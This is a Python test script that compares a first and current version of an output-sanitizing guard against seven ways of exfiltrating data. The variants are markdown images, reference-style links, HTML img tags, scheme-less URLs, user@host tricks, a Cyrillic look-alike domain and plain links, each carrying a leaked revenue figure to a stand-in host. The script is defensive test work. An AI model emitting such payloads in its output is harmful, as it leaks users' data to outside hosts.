# The guard's first version, and the current one, against the same payload written seven
# ways. Every one of these makes a markdown renderer or a browser fetch the attacker's URL.

import re
import sys

sys.path.insert(0, "code")
from clarity.platform.guard import egress_violations, strip_active   # noqa: E402

ALLOWED = {"meridian.example"}
LEAK = "t?summary=Q3%20revenue%208461842"

PAYLOADS = {
    "markdown image":          f"![audit](https://audit.invalid/{LEAK})",
    "image, URL defined below": f"![audit][r]\n\n[r]: https://audit.invalid/{LEAK}",
    "HTML img tag":            f'<img src="https://audit.invalid/{LEAK}">',
    "no scheme":               f"![audit](//audit.invalid/{LEAK})",
    "user@host trick":         f"![audit](https://meridian.example@audit.invalid/{LEAK})",
    "look-alike host":         f"![audit](https://meridіan.example/{LEAK})",   # Cyrillic і
    "a plain link":            f"[the report](https://audit.invalid/{LEAK})",
}

# The first version of the guard, kept here so the difference can be measured.
OLD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*([^)\s]+)[^)]*\)")
OLD_URL = re.compile(r"https?://([^/\s)\"']+)", re.I)


def old_strip(text: str) -> str:
    return OLD_IMAGE.sub("[image removed]", re.sub(r"<!--.*?-->", "", text, flags=re.S))


def old_egress(text: str) -> list[str]:
    return sorted({h.lower() for h in OLD_URL.findall(text) if h.lower() not in ALLOWED})


def fetches(text: str) -> bool:
    """Would a renderer still find something to fetch after stripping?"""
    return bool(re.search(r"!\[|<img|\]:\s*\S*//", text, re.I))


print(f"  {'':26} {'first version':^28} {'current version':^28}")
print(f"  {'':26} {'after strip':>14} {'egress check':>13}  {'after strip':>14} {'egress check':>13}")
for label, payload in PAYLOADS.items():
    cells = []
    for strip, egress in ((old_strip, old_egress), (strip_active, egress_violations)):
        stripped = "still fetches" if fetches(strip(payload)) else "no fetch"
        flagged = "flagged" if (egress(payload) if egress is old_egress
                                else egress(payload, ALLOWED)) else "MISSED"
        cells.append(f"{stripped:>14} {flagged:>13}")
    print(f"  {label:26} " + "  ".join(cells))
